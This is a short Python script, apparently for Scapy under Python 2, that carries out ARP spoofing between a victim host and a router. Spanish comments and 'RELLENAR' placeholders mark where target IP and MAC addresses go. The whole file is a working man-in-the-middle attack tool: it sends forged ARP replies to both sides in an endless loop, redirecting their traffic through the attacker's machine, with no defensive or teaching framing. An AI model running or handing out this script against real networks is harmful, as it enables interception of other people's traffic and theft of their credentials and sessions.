from scapy.all import *
 

def spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac):
	print "[+] Creating packet %d and sending to VICTIM..." % count
        srp1(Ether(dst=macVictim)/ARP(pdst=ipVictim, psrc=ipRouterToSpoof, hwsrc=ourMac), timeout=2, verbose = 0)
 
def spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac):
	print "[+] Creating packet %d and sending to ROUTER..." % count
        srp1(Ether(dst=macRouter)/ARP(pdst=ipRouter, psrc=ipVictimToSpoof, hwsrc=ourMac), timeout=2, verbose = 0)
 
 
count = 1
 
# Datos spoof victima
ipVictim = "RELLENAR"
macVictim = getmacbyip(ipVictim)
ipRouterToSpoof = "RELLENAR"
ourMac = "RELLENAR"
 
# Datos spoof router
ipRouter = "RELLENAR"
macRouter = getmacbyip(ipRouter)
ipVictimToSpoof = "RELLENAR"
ourMac = "RELLENAR"
 

 
while True:
    spoofVictim(macVictim, ipVictim, ipRouterToSpoof, ourMac)
    spoofRouter(macRouter, ipRouter, ipVictimToSpoof, ourMac)
    count += 1
